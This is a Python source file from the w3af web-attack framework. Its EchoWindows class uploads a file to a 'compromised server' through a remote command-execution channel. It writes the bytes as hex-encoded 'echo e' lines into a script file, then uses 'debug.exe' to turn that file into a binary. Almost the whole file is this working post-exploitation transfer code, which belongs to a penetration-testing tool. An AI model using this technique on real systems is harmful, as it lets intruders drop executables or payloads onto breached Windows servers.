"""
EchoWindows.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import time

import w3af.core.controllers.output_manager as om

from w3af.core.controllers.payload_transfer.base_payload_transfer import BasePayloadTransfer
from w3af.core.controllers.exceptions import BaseFrameworkException


class EchoWindows(BasePayloadTransfer):
    """
    This is a class that defines how to send a file to a remote server using the
    "echo" command.
    """

    def __init__(self, exec_method, os):
        super(EchoWindows, self).__init__(exec_method, os)
        self._exec_method_method = exec_method
        self._os = os
        self._exec_methodutedCanTransfer = False
        self._step = 24  # how many bytes per request

    def can_transfer(self):
        """
        This method is used to test if the transfer method works as expected.
        The implementation of this should transfer 10 bytes and check if they
        arrived as expected to the other end.
        """
        self._exec_methodutedCanTransfer = True

        res = self._exec_method("echo w3af")

        if 'w3af' != res:
            om.out.debug('Remote server returned: "' + res +
                         '" when expecting "w3af".')
            return False
        else:
            om.out.debug('Remote server has a working echo command.')
            return True

    def estimate_transfer_time(self, size):
        """
        :return: An estimated transfer time for a file with the specified size.
        """
        before = time.time()
        res = self._exec_method("echo w3af")
        after = time.time()

        # Estimate the time...
        numberOfRequests = size / self._step
        requestTime = after - before
        timeTaken = round(requestTime * numberOfRequests)

        om.out.debug(
            'The file transfer will take "' + str(timeTaken) + '" seconds.')
        return int(timeTaken)

    def transfer(self, data_str, destination):
        """
        This method is used to transfer the data_str from w3af to the compromised server.
        """
        om.out.debug('Starting upload.')

        self._filename = self._get_filename(destination)

        # Check if echo exists and works as expected
        if not self._exec_methodutedCanTransfer:
            if not self.can_transfer():
                msg = 'Failed to transfer file to the compromised server, '
                msg += 'EchoWindows.can_transfer returned False.'
                raise BaseFrameworkException(msg)

        # if exists, delete _filename
        res = self._exec_method('del ' + self._filename)

        # Prepare the scr file.
        self._exec_method(
            'echo n ' + self._filename + '._ >> ' + self._filename)
        self._exec_method('echo r cx' + ' >> ' + self._filename)
        self._exec_method(
            'echo ' + hex(len(data_str))[2:] + ' >> ' + self._filename)
        self._exec_method('echo f 0000 ffff 00' + ' >> ' + self._filename)

        # http://www.totse.com/en/technology/computer_technology/windowsdebugco172680.html
        i = 0
        j = 256
        while i < len(data_str):
            # Prepare the command
            cmd = "echo e " + hex(j)[2:]
            for c in data_str[i:i + self._step]:
                cmd += ' ' + hex(ord(c))[2:].zfill(2)

            cmd += " >> " + self._filename
            i += self._step
            j += self._step
            # Send the command to the remote server
            self._exec_method(cmd)

        # "close" the scr file
        self._exec_method('echo w >> ' + self._filename)
        self._exec_method('echo q >> ' + self._filename)

        # Now, I transform the text file into a exe
        # this trick was taken from sqlninja!
        om.out.debug('Transforming the text file into a binary file. Thanks'
                     ' to icesurfer and sqlninja for this technique!')
        res = self._exec_method('debug < ' + self._filename)
        if 'file creation error' in res.lower():
            raise BaseFrameworkException('Error in remote debug.exe command.')
        extension = self._get_extension(destination)
        om.out.debug('Changing the extension of the binary file to match the original one ()')
        res = self._exec_method('move ' + self._filename + '._ ' +
                                self._filename + '.' + extension)

        om.out.debug('Finished file upload.')

    def _get_extension(self, filename):
        if len(filename.split('.')) != 1:
            return filename.split('.')[-1:][0]
        else:
            return ''

    def _get_filename(self, filename):
        if len(filename.split('.')) != 1:
            return '.'.join(filename.split('.')[:-1])
        else:
            return filename

    def get_speed(self):
        """
        :return: The transfer speed of the transfer object. It should return
                 a number between 100 (fast) and 1 (slow)
        """
        return 1
